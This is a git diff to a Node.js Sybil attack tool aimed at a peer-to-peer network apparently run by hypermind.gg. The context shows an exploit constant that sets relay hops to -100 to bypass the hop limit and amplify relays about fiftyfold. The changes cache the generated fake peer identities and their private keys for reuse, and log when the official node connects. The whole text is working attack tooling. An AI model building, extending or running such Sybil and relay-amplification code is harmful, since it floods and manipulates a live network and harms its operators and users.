@@ -3,12 +3,20 @@ const crypto = require("crypto");
 const sodium = require("sodium-native");
 const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
 const os = require("os");
+const fs = require("fs");
+const path = require("path");
+
+const CACHE_FILE = path.join(__dirname, 'identities_cache.json');
 
 const TOPIC_NAME = "hypermind-lklynet-v1";
 const TOPIC = crypto.createHash("sha256").update(TOPIC_NAME).digest();
 const POW_PREFIX = "0000";
 const HEARTBEAT_INTERVAL = 5000;
 const NEGATIVE_HOPS = -100; // Exploit: bypasses MAX_RELAY_HOPS, causes ~102 relays instead of 2
+
+// Official hypermind.gg node ID for tracking
+const OFFICIAL_NODE_ID = "302a300506032b657003210033fb4e4b123acbc07e602718cc14b45defe162fbdef7e287d193b775d401f05e";
+let seenOfficialNode = false;
 
 // --- WORKER THREAD LOGIC ---
 if (!isMainThread) {
@@ -88,7 +96,49 @@ class SybilAttacker {
         this.heartbeatInterval = null;
     }
 
+    loadCachedIdentities() {
+        try {
+            if (fs.existsSync(CACHE_FILE)) {
+                console.log('Loading cached identities...');
+                const data = JSON.parse(fs.readFileSync(CACHE_FILE, 'utf8'));
+                // Convert base64 back to Buffer
+                return data.map(p => ({
+                    ...p,
+                    privateKeyBuffer: Buffer.from(p.privateKeyBuffer, 'base64')
+                }));
+            }
+        } catch (e) {
+            console.log('Cache load failed, generating fresh:', e.message);
+        }
+        return null;
+    }
+
+    saveCachedIdentities() {
+        try {
+            console.log('Saving identities to cache...');
+            // Convert Buffer to base64 for JSON serialization
+            const data = this.fakePeers.map(p => ({
+                id: p.id,
+                privateKeyBuffer: p.privateKeyBuffer.toString('base64'),
+                nonce: p.nonce,
+                seq: 0
+            }));
+            fs.writeFileSync(CACHE_FILE, JSON.stringify(data));
+            console.log(`Cached ${data.length} identities to ${CACHE_FILE}`);
+        } catch (e) {
+            console.log('Cache save failed:', e.message);
+        }
+    }
+
     async generateIdentitiesParallel() {
+        // Try loading from cache first
+        const cached = this.loadCachedIdentities();
+        if (cached && cached.length >= this.numBots) {
+            this.fakePeers = cached.slice(0, this.numBots);
+            console.log(`Loaded ${this.fakePeers.length} identities from cache.`);
+            return;
+        }
+
         const numCPUs = os.cpus().length;
         const botsPerWorker = Math.floor(this.numBots / numCPUs);
         const remainder = this.numBots % numCPUs;
@@ -142,6 +192,9 @@ class SybilAttacker {
         
         this.fakePeers = results.flat();
         console.log(`Generated ${this.fakePeers.length} identities.`);
+
+        // Save to cache for future runs
+        this.saveCachedIdentities();
     }
 
     setupSigningWorkers() {
@@ -230,7 +283,25 @@ class SybilAttacker {
         console.log(`New connection established (${this.connections.size + 1} total)`);
         this.connections.add(socket);
 
-        socket.on("data", () => {});
+        socket.on("data", (data) => {
+            try {
+                const msgs = data.toString().split(\"\\n\").filter(x => x.trim());
+                for (const msgStr of msgs) {
+                    const msg = JSON.parse(msgStr);
+                    if (msg.id && msg.hops === 0) {
+                        const shortId = msg.id.slice(0, 16) + \"...\";
+                        if (msg.id === OFFICIAL_NODE_ID) {
+                            if (!seenOfficialNode) {
+                                console.log(`\ud83c\udf1f OFFICIAL NODE CONNECTED: ${shortId}`);
+                                seenOfficialNode = true;
+                            }
+                        } else {
+                            console.log(`Peer: ${shortId}`);
+                        }
+                    }
+                }
+            } catch (e) {}
+        });
 
         socket.on("close", () => {
             this.connections.delete(socket);
